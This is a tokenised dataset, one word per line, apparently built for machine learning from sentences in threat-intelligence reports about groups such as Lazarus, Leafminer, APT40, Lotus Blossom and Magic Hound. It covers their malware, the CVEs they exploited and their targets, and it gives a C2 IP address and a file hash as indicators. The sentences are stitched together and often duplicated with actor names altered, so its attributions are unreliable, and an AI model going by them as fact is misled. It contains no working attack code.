conducted
against
the
SWIFT
.
 
The
exploit
,
which
takes
advantage
of
CVE-2018-4878
,
allows
an
attacker
to
execute
arbitrary
code
such
as
an
implant
.
 
These
implants
are
variations
of
earlier
forms
of
Bankshot
,
a
remote
access
tool
that
gives
an
attacker
full
capability
on
a
victim
's
system
.
 
Bankshot
was
first
reported
by
the
Department
of
Homeland
Security
on
December
13
,
2017
,
and
has
only
recently
resurfaced
in
newly
compiled
variants
.
 
We
have
found
what
may
be
an
early
data-gathering
stage
for
future
possible
heists
from
financial
organizations
in
Turkey
(
and
possibly
other
countries
)
.
 
Documents
with
the
flash
exploit
managed
to
evade
static
defenses
and
remain
undetected
as
an
exploit
on
VirusTotal
.
 
This
malware
report
contains
analysis
of
one
32-bit
Windows
executable
file
,
identified
as
a
Remote
Access
Trojan
(
RAT
)
.
 
This
malware
is
capable
of
accessing
device
configuration
data
,
downloading
additional
files
,
executing
commands
,
modifying
the
registry
,
capturing
screen
shots
,
and
exfiltrating
data
.
 
Volgmer
is
a
backdoor
Trojan
designed
to
provide
covert
access
to
a
compromised
system
.
 
It
is
suspected
that
spear
phishing
is
the
primary
delivery
mechanism
for
Volgmer
infections
;
however
,
HIDDEN
COBRA
actors
use
a
suite
of
custom
tools
,
some
of
which
could
also
be
used
to
initially
compromise
a
system
.
 
Since
at
least
2013
,
HIDDEN
COBRA
actors
have
been
observed
using
Volgmer
malware
in
the
wild
to
target
the
government
,
financial
,
automotive
,
and
media
industries
.
 
Therefore
,
it
is
possible
that
additional
HIDDEN
COBRA
malware
may
be
present
on
network
infrastructure
compromised
with
Volgmer
.
 
As
a
backdoor
Trojan
,
Volgmer
has
several
capabilities
including
:
gathering
system
information
,
updating
service
registry
keys
,
downloading
and
uploading
files
,
executing
commands
,
terminating
processes
,
and
listing
directories
.
 
In
one
of
the
samples
received
for
analysis
,
the
US-CERT
Code
Analysis
Team
observed
botnet
controller
functionality
.
 
Volgmer
payloads
have
been
observed
in
32-bit
form
as
either
executables
or
dynamic-link
library
(
.dll
)
Lazarus
actors
commonly
maintain
persistence
on
a
victim
's
system
by
installing
the
malware-as-a-service
.
 
Working
with
U.S.
Government
partners
,
DHS
and
FBI
identified
Trojan
malware
variants
used
by
the
North
Korean
government
-
referred
to
by
the
U.S.
Government
as
BADCALL
.
 
The
malware
uses
a
custom
binary
protocol
to
beacon
back
to
the
command
and
control
(
C2
)
server
,
often
via
TCP
PROT
8080
or
8088
,
with
some
payloads
implementing
Secure
Socket
Layer
(
SSL
)
encryption
to
obfuscate
communications
.
 
DHS
and
FBI
are
distributing
this
MAR
to
enable
network
defense
and
reduce
exposure
to
North
Korean
government
malicious
cyber
activity
.
 
The
malware
known
as
RATANKBA
is
just
one
of
the
weapons
in
Lazarus
'
arsenal
.
 
We
analyzed
a
new
RATANKBA
variant
(
BKDR_RATANKBA.ZAELA
)
,
discovered
in
June
2017
,
that
uses
a
PowerShell
script
instead
of
its
more
traditional
PE
executable
forma
version
that
other
researchers
also
recently
identified
.
 
Around
55%
of
the
victims
of
Lazarus
were
located
in
India
and
neighboring
countries
.
 
Lazarus
group
could
have
been
active
since
late
2016
,
was
used
in
a
recent
campaign
targeting
financial
institutions
using
watering
hole
attacks
.
 
Since
they
first
emerged
back
in
2007
with
a
series
of
cyberespionage
attacks
against
the
South
Korean
government
,
these
threat
actors
have
successfully
managed
to
pull
off
some
of
the
most
notable
and
devastating
targeted
attackssuch
as
the
widely-reported
2014
Sony
hack
and
the
2016
attack
on
a
Bangladeshi
bankin
recent
history
.
 
It
's
possible
that
Lazarus
is
using
RATANKBA
to
target
larger
organizations
.
 
RATANKBA
is
delivered
to
its
victims
using
a
variety
of
lure
documents
,
including
Microsoft
Office
documents
,
malicious
CHM
files
,
and
different
script
downloaders
.
 
Overall
,
an
organization
will
need
multilayered
security
strategies
,
as
Lazarus
and
other
similar
groups
are
experienced
cybercriminals
who
employ
different
strategies
to
get
past
organizational
defenses
.
 
simultaneous
use
of
the
detected
Win32/KillDisk.NBO
variants
.
 
Working
with
U.S.
Government
partners
,
DHS
and
FBI
identified
Trojan
malware
variants
used
by
the
North
Korean
government
commonly
known
as
HARDRAIN
.
 
These
files
have
the
capability
to
download
and
install
malware
,
install
proxy
and
Remote
Access
Trojans
(
RATs
)
,
connect
to
command
and
control
(
C2
)
servers
to
receive
additional
instructions
,
and
modify
the
victim
's
firewall
to
allow
incoming
connections
.
 
The
cybercriminal
group
Lazarus
has
a
history
of
attacking
financial
organizations
in
Asia
and
Latin
America
.
 
We
also
recently
discovered
that
Lazarus
successfully
planted
their
backdoor
(
detected
by
Trend
Micro
as
BKDR_BINLODR.ZNFJ-A
)
into
several
machines
of
financial
institutions
across
Latin
America
.
 
We
determined
that
these
backdoors
were
installed
on
the
targets
'
machines
on
September
19
2018
,
based
mainly
on
the
service
creation
time
of
the
loader
component
.
 
Just
last
week
Lazarus
were
found
stealing
millions
from
ATMs
across
Asia
and
Africa
.
 
These
and
other
tools
used
by
the
Lazarus
group
can
be
mitigated
by
routinely
scanning
the
network
for
any
malicious
activity
to
help
prevent
the
malware
from
entering
and
spreading
through
an
organization
.
 
The
backdoors
Lazarus
are
deploying
are
difficult
to
detect
and
a
significant
threat
to
the
privacy
and
security
of
enterprises
,
allowing
attackers
to
steal
information
,
delete
files
,
install
malware
,
and
more
.
 
Trend
Micro
endpoint
solutions
such
as
Trend
Micro
Smart
Protection
Suites
and
Worry-Free
Business
Security
can
protect
users
and
businesses
from
these
threats
by
detecting
malicious
files
and
spammed
messages
as
well
as
blocking
all
related
malicious
URLs
.
 
FBI
has
high
confidence
that
HIDDEN
COBRA
actors
are
using
malware
variants
in
conjunction
with
proxy
servers
to
maintain
a
presence
on
victim
networks
and
to
further
network
exploitation
.
 
Ransomware
that
has
been
publicly
named
"
WannaCry
"
,
"
WCry
"
or
"
WanaCrypt0r
"
(
based
on
strings
in
the
binary
and
encrypted
files
)
has
spread
to
at
least
74
countries
as
of
Friday
12
May
2017
,
reportedly
targeting
Russia
initially
,
and
spreading
to
telecommunications
,
shipping
,
car
manufacturers
,
universities
and
health
care
industries
,
among
others
.
 
Ransomware
that
has
been
publicly
named
"
WannaCry
"
,
"
WCry
"
or
"
WanaCrypt0r
"
(
based
on
strings
in
the
binary
and
encrypted
files
)
has
spread
to
at
least
74
countries
as
of
Friday
12
May
2017
,
reportedly
targeting
Russia
initially
,
and
spreading
to
telecommunications
,
shipping
,
car
manufacturers
,
universities
and
health
care
industries
,
among
others
.
 
We
also
saw
that
the
attack
technique
bears
some
resemblance
to
a
previous
2017
Lazarus
attack
,
analyzed
by
BAE
Systems
,
against
targets
in
Asia
.
 
WannaCry
utilizes
EternalBlue
by
crafting
a
custom
SMB
session
request
with
hard-coded
values
based
on
the
target
system
.
 
Notably
,
after
the
first
SMB
packet
sent
to
the
victim
's
IP
address
,
WannaCry
sends
two
additional
packets
to
the
victim
containing
the
hard-coded
IP
addresses
192.168.56.20
and
172.16.99.5
.
 
WannaCry
(
also
known
as
WCry
or
WanaCryptor
)
malware
is
a
self-propagating
(
worm-like
)
ransomware
that
spreads
through
internal
networks
and
over
the
public
internet
by
exploiting
a
vulnerability
in
Microsoft
's
Server
Message
Block
(
SMB
)
protocol
,
MS17-010
.
 
The
WannaCry
malware
consists
of
two
distinct
components
,
one
that
provides
ransomware
functionality
and
a
component
used
for
propagation
,
which
contains
functionality
to
enable
SMB
exploitation
capabilities
.
 
WannaCry
leverages
an
exploit
,
codenamed
"
EternalBlue
"
,
that
was
released
by
the
Shadow
Brokers
on
April
14
,
2017
.
 
WannaCry
appends
encrypted
data
files
with
the
.WCRY
extension
,
drops
and
executes
a
decryptor
tool
,
and
demands
$300
or
$600
USD
(
via
Bitcoin
)
to
decrypt
the
data
.
 
In
May
2017
,
SecureWorks
Counter
Threat
Unit
(
CTU
)
researchers
investigated
a
widespread
and
opportunistic
WCry
(
also
known
as
WanaCry
,
WanaCrypt
,
and
Wana
Decrypt0r
)
ransomware
campaign
that
impacted
many
systems
around
the
world
.
 
In
November
2017
,
SecureWorks
Counter
Threat
Unit
(
CTU
)
researchers
investigated
a
widespread
and
opportunistic
WCry
ransomware
campaign
that
impacted
many
systems
around
the
world
.
 
Microsoft
addressed
the
SMBv1
vulnerabilities
in
March
2017
with
Security
Bulletin
MS17-010
.
 
The
worm
leverages
an
SMBv1
exploit
that
originates
from
tools
released
by
the
Shadow
Brokers
threat
group
in
April
.
 
If
the
DoublePulsar
backdoor
does
not
exist
,
then
the
SMB
worm
attempts
to
compromise
the
target
using
the
Eternalblue
SMBv1
exploit
.
 
WCry
uses
a
combination
of
the
RSA
and
AES
algorithms
to
encrypt
files
.
 
The
campaign
's
use
of
an
SMB
worm
to
distribute
WCry
contributed
to
the
ransomware
's
virulence
.
 
Last
week
Microsoft
,
working
together
with
Facebook
and
others
in
the
security
community
,
took
strong
steps
to
protect
our
customers
and
the
internet
from
ongoing
attacks
by
an
advanced
persistent
threat
actor
known
to
us
as
ZINC
,
also
known
as
the
Lazarus
Group
.
 
Last
week
Microsoft
,
working
together
with
Facebook
,
took
strong
steps
to
protect
our
customers
and
the
internet
from
ongoing
attacks
by
the
Lazarus
Group
.
 
We
concluded
that
Lazarus
Group
was
responsible
for
WannaCry
,
a
destructive
malware
.
 
We
concluded
that
Lazarus
Group
was
responsible
for
WannaCry
,
a
destructive
attack
in
May
that
targeted
Microsoft
customers
.
 
Today
,
the
governments
of
the
United
States
,
United
Kingdom
,
Australia
,
Canada
,
New
Zealand
and
Japan
have
all
announced
that
the
government
of
North
Korea
is
responsible
for
the
activities
of
ZINC/Lazarus
.
 
In
November
2017
,
Secureworks
Counter
Threat
Unit
(
CTU
)
researchers
discovered
the
North
Korean
cyber
threat
group
,
known
as
Lazarus
Group
and
internally
tracked
as
NICKEL
ACADEMY
by
Secureworks
,
had
launched
a
malicious
spearphishing
campaign
using
the
lure
of
a
job
opening
for
the
CFO
role
at
a
European-based
cryptocurrency
company
.
 
In
November
2017
,
CTU
researchers
discovered
the
North
Korean
cyber
threat
group
,
known
as
Lazarus
Group
,
had
launched
a
malicious
spearphishing
campaign
using
the
lure
of
a
job
opening
for
the
CFO
role
at
a
European-based
cryptocurrency
company
.
 
Bankshot
is
designed
to
persist
on
a
victim
's
network
for
further
exploitation
;
thus
the
Advanced
Threat
Research
team
believes
this
operation
is
intended
to
gain
access
to
specific
financial
organizations
.
 
CTU
researchers
assess
this
as
the
continuation
of
activity
first
observed
in
2016
,
and
it
is
likely
that
the
campaign
is
ongoing
.
 
CTU
researchers
have
observed
NICKEL
ACADEMY
(
Lazarus
)
copying
and
pasting
job
descriptions
from
online
recruitment
sites
in
previous
campaigns
.
 
There
are
several
indicators
,
which
have
led
CTU
researchers
to
believe
with
high
confidence
that
NICKEL
ACADEMY
is
behind
the
current
spearphishing
campaign
.
 
CTU
researchers
also
identified
components
in
the
custom
C2
protocol
being
used
which
they
have
seen
utilized
by
Nickel
Academy
(
Lazarus
)
previously
.
 
CTU
researchers
also
identified
components
in
the
custom
C2
protocol
being
used
(
the
ACT
in
which
the
malware
talks
to
the
Command
and
Control
Servers
)
which
they
have
seen
utilized
by
Nickel
Academy
(
Lazarus
)
previously
.
 
Leafminer
attempts
to
infiltrate
target
networks
through
various
means
of
intrusion
:
watering
hole
websites
,
vulnerability
scans
of
network
services
on
the
internet
,
and
brute-force
login
attempts
.
 
The
researchers
found
that
there
are
common
elements
in
the
macro
and
in
the
first-
stage
RAT
used
in
this
campaign
,
with
former
campaigns
of
the
NICKEL
ACADEMY
(
Lazarus
)
threat
group
.
 
During
our
investigation
,
there
was
a
breakthrough
discovery
that
helped
connect
Leafminer
to
a
number
of
attacks
observed
on
systems
in
the
Middle
East
and
identify
the
toolkit
used
in
the
group
's
efforts
of
intrusion
,
lateral
movement
,
and
Exfiltration
.
 
As
of
early
June
2018
,
the
server
hosted
112
files
in
a
subdirectory
that
could
be
accessed
through
a
public
web
shell
planted
by
the
Leafminer
.
 
As
of
early
June
2018
,
the
server
hosted
112
files
in
a
subdirectory
that
could
be
accessed
through
a
public
web
shell
planted
by
the
attackers
.
 
The
Leafminer
's
post-compromise
toolkit
suggests
that
Leafminer
is
looking
for
email
data
,
files
,
and
database
servers
on
compromised
target
systems
.
 
Researching
the
hacker
handle
MagicCoder
results
in
references
to
the
Iranian
hacking
forum
Ashiyane
as
well
as
defacements
by
the
Iranian
hacker
group
Sun
Army
.
 
Targeted
regions
included
in
the
list
of
Leafminer
are
Saudi
Arabia
,
United
Arab
Emirates
,
Qatar
,
Kuwait
,
Bahrain
,
Egypt
,
Israel
,
and
Afghanistan
.
 
Our
investigation
of
Leafminer
started
with
the
discovery
of
JavaScript
code
on
several
compromised
websites
in
the
Middle
East
.
 
This
included
the
Fuzzbunch
framework
that
was
part
of
an
infamous
leak
of
exploits
and
tools
by
the
Shadow
Brokers
in
April
2017
.
 
Leafminer
has
developed
exploit
payloads
for
this
framework
(
Table
2
)
that
deliver
custom
malware
through
attacks
against
SMB
vulnerabilities
described
by
Microsoft
.
 
The
EternalBlue
exploits
from
the
framework
received
worldwide
attention
after
being
used
in
the
ransomware
campaigns
WannaCry
in
May
and
Petya
/
NotPetya
in
June
2017
.
 
The
Leafminer
operators
use
EternalBlue
to
attempt
lateral
movement
within
target
networks
from
compromised
staging
servers
.
 
Symantec
also
observed
attempts
by
Leafminer
to
scan
for
the
Heartbleed
vulnerability
(
CVE-2014-0160
)
from
an
attacker-controlled
IP
address
.
 
Furthermore
,
the
Leafminer
arsenal
server
hosted
a
Python
script
to
scan
for
this
vulnerability
.
 
Another
intrusion
approach
used
by
Leafminer
seems
a
lot
less
sophisticated
than
the
previously
described
methods
but
can
be
just
as
effective
:
using
specific
hacktools
to
guess
the
login
passwords
for
services
exposed
by
a
targeted
system
.
 
Commands
found
in
a
readme
text
that
was
stored
in
a
ZIP
archive
together
with
the
hacktool
THC
Hydra
in
Leafminer
's
tool
arsenal
represent
online
dictionary
attacks
on
Microsoft
Exchange
and
Remote
Desktop
Protocol
services
of
regional
government
servers
in
Saudi
Arabia
.
 
Symantec
identified
two
strains
of
custom
malware
used
by
the
Leafminer
group
:
Trojan.Imecab
and
Backdoor.Sorgu
.
 
Leafminer
is
a
highly
active
group
,
responsible
for
targeting
a
range
of
organizations
across
the
Middle
East
.
 
Leafminer
appears
to
be
based
in
Iran
and
seems
to
be
eager
to
learn
from
and
capitalize
on
tools
and
techniques
used
by
more
advanced
threat
actors
.
 
Leafminer
also
utilized
Process
Doppelganging
,
a
detection
evasion
technique
first
discussed
at
the
Black
Hat
EU
conference
last
year
.
 
Dragos
has
identified
Leafminer
group
targeting
access
operations
in
the
electric
utility
sector
.
 
Analysis
of
RASPITE
tactics
,
techniques
,
and
procedures
(
TTPs
)
indicate
the
group
has
been
active
in
some
form
since
early
-
to
mid-2017
.
 
RASPITE
targeting
includes
entities
in
the
US
,
Middle
East
,
Europe
,
and
East
Asia
.
 
RASPITE
overlaps
significantly
with
Symantec
's
Leafminer
,
which
recently
released
a
report
on
the
group
's
activity
in
the
Middle
East
.
 
RASPITE
's
activity
to
date
currently
focuses
on
initial
access
operations
within
the
electric
utility
sector
.
 
This
means
that
the
Leafminer
group
is
targeting
electric
utilities
.
 
While
the
group
has
not
yet
demonstrated
an
ICS
capability
,
RASPITE
's
recent
targeting
focus
and
methodology
are
clear
indicators
of
necessary
activity
for
initial
intrusion
operations
into
an
IT
network
to
prepare
the
ACT
for
later
potential
ICS
events
.
 
Active
since
at
least
2014
,
this
actor
has
long-standing
interest
in
maritime
industries
,
naval
defense
contractors
,
and
associated
research
institutions
in
the
United
States
and
Western
Europe
.
 
Active
since
at
least
2014
,
the
Leviathan
has
long-standing
interest
in
maritime
industries
,
naval
defense
contractors
,
and
associated
research
institutions
in
the
United
States
and
Western
Europe
.
 
On
September
15
and
19
,
2017
,
Proofpoint
detected
and
blocked
spearphishing
emails
from
this
group
targeting
a
US
shipbuilding
company
and
a
US
university
research
center
with
military
ties
.
 
The
attachments
exploited
CVE-2017-8759
which
was
discovered
and
documented
only
five
days
prior
to
the
campaign
.
 
Some
of
the
documents
exploited
CVE-2017-0199
to
deliver
the
payload
.
 
Between
August
2
and
4
,
the
actor
sent
targeted
spearphishing
emails
containing
malicious
URLs
linking
to
documents
to
multiple
defense
contractors
.
 
Between
August
2
and
4
,
the
Leviathan
sent
targeted
spearphishing
emails
containing
malicious
URLs
linking
to
documents
to
multiple
defense
contractors
.
 
The
Leviathan
also
occasionally
used
macro-laden
Microsoft
Word
documents
to
target
other
US
research
and
development
organizations
during
this
period
.
 
The
period
between
November
2014
and
January
2015
marked
one
of
the
earlier
instances
in
which
Proofpoint
observed
persistent
exploitation
attempts
by
this
actor
.
 
The
Leviathan
,
whose
espionage
activities
primarily
focus
on
targets
in
the
US
and
Western
Europe
with
military
ties
,
has
been
active
since
at
least
2014
.
 
This
actor
,
whose
espionage
activities
primarily
focus
on
targets
in
the
US
and
Western
Europe
with
military
ties
,
has
been
active
since
at
least
2014
.
 
The
campaign
is
linked
to
a
group
of
suspected
Chinese
cyber
espionage
actors
we
have
tracked
since
2013
,
dubbed
TEMP.Periscope
.
 
The
Leviathan
generally
emailed
Microsoft
Excel
documents
with
malicious
macros
to
US
universities
with
military
interests
,
most
frequently
related
to
the
Navy
.
 
The
current
campaign
is
a
sharp
escalation
of
detected
activity
since
summer
2017
.
 
Since
early
2018
,
FireEye
(
including
our
FireEye
as
a
Service
(
FaaS
)
,
Mandiant
Consulting
,
and
iSIGHT
Intelligence
teams
)
has
been
tracking
an
ongoing
wave
of
intrusions
targeting
engineering
and
maritime
entities
,
especially
those
connected
to
South
China
Sea
issues
.
 
Known
targets
of
the
Leviathan
have
been
involved
in
the
maritime
industry
,
and
research
institutes
,
academic
organizations
,
and
private
firms
in
the
United
States
.
 
Active
since
at
least
2013
,
TEMP.Periscope
has
primarily
focused
on
maritime-related
targets
across
multiple
verticals
,
including
engineering
firms
,
shipping
and
transportation
,
manufacturing
,
defense
,
government
offices
,
and
research
universities
.
 
TEMP.Periscope
overlaps
in
targeting
,
as
well
as
tactics
,
techniques
,
and
procedures
(
TTPs
)
,
with
TEMP.Jumper
,
a
group
that
also
overlaps
significantly
with
public
reporting
on
NanHaiShu
.
 
The
actor
has
conducted
operations
since
at
least
2013
in
support
of
China
's
naval
modernization
effort
.
 
FireEye
is
highlighting
a
Cyber
Espionage
operation
targeting
crucial
technologies
and
traditional
intelligence
targets
from
a
China-nexus
state
sponsored
actor
we
call
APT40
.
 
The
Leviathan
group
has
specifically
targeted
engineering
,
transportation
,
and
the
defense
industry
,
especially
where
these
sectors
overlap
with
maritime
technologies
.
 
We
believe
APT40
's
emphasis
on
maritime
issues
and
naval
technology
ultimately
support
China
's
ambition
to
establish
a
blue-water
navy
.
 
Within
a
year
APT40
was
observed
masquerading
as
a
UUV
manufacturer
,
and
targeting
universities
engaged
in
naval
research
.
 
APT40
engages
in
broader
regional
targeting
against
traditional
intelligence
targets
,
especially
organizations
with
operations
in
Southeast
Asia
.
 
We
assess
with
moderate
confidence
that
APT40
is
a
state-sponsored
Chinese
Cyber
Espionage
operation
.
 
The
actor
's
targeting
is
consistent
with
Chinese
state
interests
and
there
are
multiple
technical
artifacts
indicating
the
actor
is
based
in
China
.
 
Analysis
of
the
operational
times
of
the
group
's
activities
indicates
that
it
is
probably
centered
around
China
Standard
TIME
(
UTC
+8
)
.
 
APT40
relies
heavily
on
web
shells
for
an
initial
foothold
into
an
organization
.
 
APT40
has
been
observed
leveraging
a
variety
of
techniques
for
initial
compromise
,
including
web
server
exploitation
,
phishing
campaigns
delivering
publicly
available
and
custom
backdoors
,
and
strategic
web
compromises
.
 
Depending
on
placement
,
a
Web
shell
can
provide
continued
access
to
victims
'
environments
,
re-infect
victim
systems
,
and
facilitate
lateral
movement
.
 
The
group
's
capabilities
are
more
than
the
much
discussed
CVE-2012-0158
exploits
over
the
past
few
years
.
 
A
paper
released
today
by
our
colleagues
at
Palo
Alto
Networks
presented
a
portion
of
data
on
this
crew
under
the
label
"
the
Lotus
Blossom
Operation
"
,
likely
named
for
the
debug
string
present
in
much
of
the
"
Elise
"
codebase
since
at
least
2012
:
"
d:\lstudio\projects\lotus\
"
.
 
Instead
,
the
Spring
Dragon
group
is
known
to
have
employed
spearphish
exploits
,
strategic
web
compromises
,
and
watering
holes
attack
.
 
The
group
's
spearphish
toolset
includes
PDF
exploits
,
Adobe
Flash
Player
exploits
,
and
the
common
CVE-2012-0158
Word
exploits
including
those
generated
from
the
infamous
"
Tran
Duy
Linh
"
kit
.
 
The
Spring
Dragon
appears
to
have
rolled
out
a
steady
mix
of
exploits
against
government-related
organizations
in
VN
,
TW
,
PH
,
and
other
locations
over
the
past
few
years
.
 
Organizations
located
in
Myanmar
and
targeted
by
Spring
Dragon
have
gone
unmentioned
.
 
Spring
Dragon
's
infiltration
techniques
there
were
not
simply
spearphish
.
 
The
download
name
was
"
Zawgyi_Keyboard_L.zip
"
,
and
it
dropped
a
"
setup.exe
"
that
contained
several
backdoor
components
,
including
an
Elise
"
wincex.dll
"
(
a42c966e26f3577534d03248551232f3
,
detected
as
Backdoor.Win32.Agent.delp
)
.
 
While
this
particular
actor
effectively
used
their
almost
worn
out
CVE-2012-0158
exploits
in
the
past
,
Spring
Dragon
employs
more
involved
and
creative
intrusive
activity
as
well
.
 
The
well-known
threat
group
called
DRAGONFISH
or
Lotus
Blossom
are
distributing
a
new
form
of
Elise
malware
targeting
organizations
for
espionage
purposes
.
 
The
threat
actors
associated
with
DRAGONFISH
have
previously
focused
their
campaigns
on
targets
in
Southeast
Asia
,
specifically
those
located
in
countries
near
the
South
China
Sea
.
 
iDefense
analysts
have
identified
a
campaign
likely
to
be
targeting
members
of
or
those
with
affiliation
or
interest
inthe
ASEAN
Defence
Ministers
'
Meeting
(
ADMM
)
.
 
iDefense
analysts
have
identified
a
campaign
likely
to
be
targeting
members
of
or
those
with
affiliation
or
interest
in
the
ASEAN
Defence
Minister
's
Meeting
(
ADMM
)
.
 
iDefense
assesses
with
high
confidence
that
this
campaign
is
associated
with
the
threat
group
DRAGONFISH
(
also
known
as
Lotus
Blossom
and
Spring
Dragon
)
.
 
To
mitigate
the
threat
of
the
described
campaign
,
security
teams
can
consider
blocking
access
to
the
C2
server
103.236.150.14
and
,
where
applicable
,
ensure
that
the
Microsoft
Security
Update
KB2553204
is
installed
in
order
to
patch
the
CVE-2017-11882
vulnerability
.
 
The
actors
attempted
to
exploit
CVE-2014-6332
using
a
slightly
modified
version
of
the
proof-of-concept
(
POC
)
code
to
install
a
Trojan
called
Emissary
,
which
is
related
to
the
Operation
Lotus
Blossom
campaign
.
 
The
targeting
of
this
individual
suggests
the
actors
are
interested
in
breaching
the
French
Ministry
of
Foreign
Affairs
itself
or
gaining
insights
into
relations
between
France
and
Taiwan
.
 
On
November
10
,
2015
,
threat
actors
sent
a
spear-phishing
email
to
an
individual
at
the
French
Ministry
of
Foreign
Affairs
.
 
On
November
10
,
2015
,
Lotus
Blossom
sent
a
spear-phishing
email
to
an
individual
at
the
French
Ministry
of
Foreign
Affairs
.
 
Both
attachments
are
malicious
Word
documents
that
attempt
to
exploit
the
Windows
OLE
Automation
Array
Remote
Code
Execution
Vulnerability
tracked
by
CVE-2014-6332
.
 
Lotus
Blossom
attempted
to
exploit
CVE-2014-6332
using
the
POC
code
available
in
the
wild
.
 
This
Trojan
is
related
to
the
Elise
backdoor
described
in
the
Operation
Lotus
Blossom
report
.
 
Lotus
Blossom
was
attempting
to
exploit
CVE-2014-6332
to
install
a
new
version
of
the
Emissary
Trojan
,
specifically
version
5.3
.
 
APT
threat
actors
,
most
likely
nation
state-sponsored
,
targeted
a
diplomat
in
the
French
Ministry
of
Foreign
Affairs
with
a
seemingly
legitimate
invitation
to
a
technology
conference
in
Taiwan
.
 
Additionally
,
the
targeting
of
a
French
diplomat
based
in
Taipei
,
Taiwan
aligns
with
previous
targeting
by
these
actors
,
as
does
the
separate
infrastructure
.
 
The
Elise
malware
used
by
Lotus
Blossom
,
which
was
an
attack
campaign
on
targets
in
Southeast
Asia
.
 
Based
on
the
targeting
and
lures
,
Unit
42
assesses
that
the
Lotus
Blossom
actors
'
collection
requirements
include
militaries
and
government
agencies
in
Southeast
Asia
.
 
In
December
2015
,
Unit
42
published
a
blog
about
a
cyber
espionage
attack
using
the
Emissary
Trojan
as
a
payload
.
 
The
oldest
sample
we
found
was
created
in
2009
,
indicating
this
tool
has
been
in
use
for
almost
seven
years
.
 
In
addition
,
Emissary
appears
to
against
Taiwan
or
Hong
Kong
,
all
of
the
decoys
are
written
in
Traditional
Chinese
,
and
they
use
themes
related
to
the
government
or
military
.
 
Of
note
,
this
is
three
years
earlier
than
the
oldest
Elise
sample
we
have
found
,
suggesting
this
group
has
been
active
longer
than
previously
documented
.
 
In
addition
,
we
observed
a
TTP
shift
post
publication
with
regards
to
their
malware
delivery
;
they
started
using
compromised
but
legitimate
domains
to
serve
their
malware
.
 
All
of
the
Emissary
we've
collected
are
written
in
Traditional
Chinese
,
which
is
used
primarily
in
Taiwan
and
Hong
Kong
.
 
One
of
the
most
interesting
observations
made
during
this
analysis
is
that
the
amount
of
development
effort
devoted
to
Emissary
significantly
increased
after
we
published
our
Operation
Lotus
Blossom
report
in
June
2015
,
resulting
in
many
new
versions
of
the
Emissary
Trojan
.
 
Lotus
Blossom
targeted
the
government
,
higher
education
,
and
high
tech
companies
.
 
Our
evidence
suggests
that
malware
authors
created
Emissary
as
early
as
2009
,
which
suggests
that
threat
actors
have
relied
on
this
tool
as
a
payload
in
cyber-espionage
attacks
for
many
years
.
 
While
it
lacks
more
advanced
functionality
like
screen
capturing
,
it
is
still
able
to
carry
out
most
tasks
desired
by
threat
actors
:
Exfiltration
of
files
,
ability
to
download
and
execute
additional
payloads
,
and
gain
remote
shell
access
.
 
The
timeline
in
Figure
2
shows
that
the
Emissary
Trojan
was
first
created
(
version
1.0
)
in
May
2009
and
quickly
received
an
update
that
resulted
in
version
1.1
in
June
2009
.
 
Between
August
and
November
2015
the
malware
author
creates
several
new
versions
of
Emissary
,
specifically
5.0
,
5.1
,
5.3
and
5.4
in
a
much
more
rapid
succession
compared
to
development
process
in
earlier
versions
.
 
Version
2.0
received
one
update
in
October
2013
before
the
malware
author
released
version
3.0
in
December
2014
.
 
While
this
may
be
coincidental
,
the
out-of-sequence
version
3.0
sample
was
created
ten
days
after
we
published
the
Operation
Lotus
Blossom
paper
that
exposed
the
Elise
Trojan
that
is
closely
related
to
Emissary
.
 
The
Lotus
Blossom
largely
targets
military
or
government
,
with
some
cases
of
higher
education
and
high
tech
companies
.
 
The
use
of
Emissary
appears
to
be
focused
only
on
Taiwan
and
Hong
Kong
,
with
regular
malware
updates
to
avoid
detection
and
to
increase
the
odds
of
success
.
 
The
Lotus
Blossom
actors
using
Emissary
have
been
active
for
at
least
seven
years
in
Southeast
Asia
.
 
Magic
Hound
has
primarily
targeted
organizations
in
the
energy
,
government
,
and
technology
sectors
that
are
either
based
or
have
business
interests
in
Saudi
Arabia
.
 
Regardless
of
causation
,
the
rapid
development
of
new
versions
of
Emissary
suggests
that
the
malware
authors
are
making
frequent
modifications
to
evade
detection
,
which
as
a
corollary
suggests
the
Lotus
Blossom
are
actively
using
the
Emissary
Trojan
as
a
payload
in
attacks
.
 
Link
analysis
of
infrastructure
and
tools
also
revealed
a
potential
relationship
between
Magic
Hound
and
the
adversary
group
called
"
Rocket
Kitten
"
(
AKA
Operation
Saffron
Rose
,
Ajax
Security
Team
,
Operation
Woolen-Goldfish
)
as
well
as
an
older
attack
campaign
called
Newscasters
.
 
In
addition
to
the
malware
evolution
,
the
actors
also
shifted
from
solely
spear-phishing
targets
with
attachments
to
also
compromising
legitimate
websites
to
host
malware
.
 
It
is
highly
likely
the
Lotus
Blossom
used
spear-phishing
attacks
containing
links
to
these
malicious
documents
as
a
delivery
mechanism
.
 
We
were
ultimately
able
to
identify
multiple
organizations
in
the
government
,
energy
,
and
technology
sectors
targeted
by
Magic
Hound
.
 
The
Magic
Hound
attacks
did
not
rely
on
exploit
code
to
compromise
targeted
systems
,
instead
relying
on
Excel
and
Word
documents
containing
malicious
macros
.
 
The
MPK
bot
is
not
publicly
available
and
had
previously
been
attributed
to
an
adversary
group
called
"
Rocket
Kitten
"
which
has
often
been
thought
to
be
a
state
sponsored
adversary
operating
in
the
Middle
East
region
.
 
One
payload
was
a
Python
based
open
source
remote
administration
tool
(
RAT
)
called
Pupy
.
 
The
Magic
Hound
campaign
used
Word
and
Excel
documents
containing
malicious
macros
as
a
delivery
method
,
specifically
attempting
to
load
MagicHound.Rollover
.
 
Many
of
the
Fetch
samples
we
analyzed
attempted
to
obfuscate
their
functionality
by
encrypting
their
embedded
strings
using
AES
.
 
The
loader
's
main
goal
was
to
run
a
PowerShell
command
to
execute
shellcode
.
 
To
set
up
persistence
,
the
loader
writes
a
file
to
"
c:\temp\rr.exe
"
and
executes
it
with
specific
command
line
arguments
to
create
auto
run
registry
keys
.
 
The
Magic
Hound
campaign
was
also
discovered
using
a
custom
dropper
tool
,
which
we
have
named
MagicHound.DropIt
.
 
We
have
also
seen
Magic
Hound
using
DropIt
as
a
binder
,
specifically
dropping
a
legitimate
decoy
executable
along
with
the
malicious
executable
onto
the
target
host
.
 
We
also
found
a
second
IRC
bot
called
MPK
using
the
same
IP
for
its
C2
server
that
a
Leash
sample
was
hosted
on
.
 
The
Magic
Hound
attack
campaign
is
an
active
and
persistent
espionage
motivated
adversary
operating
in
the
Middle
East
region
.
 
Organizations
in
the
government
,
energy
,
and
technology
sectors
have
been
targeted
by
Magic
Hound
,
specifically
organizations
based
in
or
doing
business
in
